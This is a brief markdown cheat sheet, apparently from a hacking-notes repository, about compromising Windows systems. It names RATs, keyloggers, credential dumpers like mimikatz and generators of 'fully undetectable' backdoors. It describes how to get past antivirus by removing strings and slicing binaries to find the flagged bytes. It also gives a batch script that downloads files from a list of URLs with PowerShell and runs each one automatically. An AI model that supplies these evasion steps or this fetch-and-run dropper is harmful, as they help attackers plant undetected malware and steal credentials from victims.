# Let's _hack windows_ systems by various techniques & tools!

#### Windows evil files:
- Backdoor (eg: Quasur RAT, metasploit)
- Keylogger (eg: zLogger)
- Password recovery tool (eg: LaZagne, mimikatz)

#### Tools to generate Fully Undetectable backdoors (FUD):
- Veil
- TheFatRat
- Empire

#### How anti-virus programmes detects viruses.
Anti-viruses flag files as malicious by looking at its **signatures, string & behaviour**.
If file contains the string or words already highlighted as malicious or it behaves suspiciously like using uncommon port, 
sending data to remote server accessing data which it is not intended to have.

#### How to make backdoor undetectable if it is still detectable by few anti-viruses?
- Remove all malicious strings from the file. for eg.: _mimikatz_
- For signature based AV bypassing edit the file from every aspect by editing, removing or even by adding thing to the file, so that it outputs different signature.
- Find out which part of file is being flagged by AV.
  - Slice the binary in various sizes. For eg.: **File Name**: mimikatz.exe **File Size**: 1200050 byts
    - Let's slice it into first half: `head -c 600025 mimikatz.exe > firsthalfmimikatz.exe`
      - After finding, edit in hex editor or remove it after decompiling the source code from the main file.

### POST ABOVE
- Kon boot
- oph crack

#### Windows file downloader scripts:
### Bat scripts:
```
@echo off

set files='url1','url2','url3'

powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
```

## References:
[Anti-virus evastion - Mimikatz by _ippsec_](https://www.youtube.com/watch?v=9pwMCHlNma4&t=1118s)<br>
[Create FUD backdoors by _zSecurity_](https://www.youtube.com/watch?v=cgM-_42rWbM)







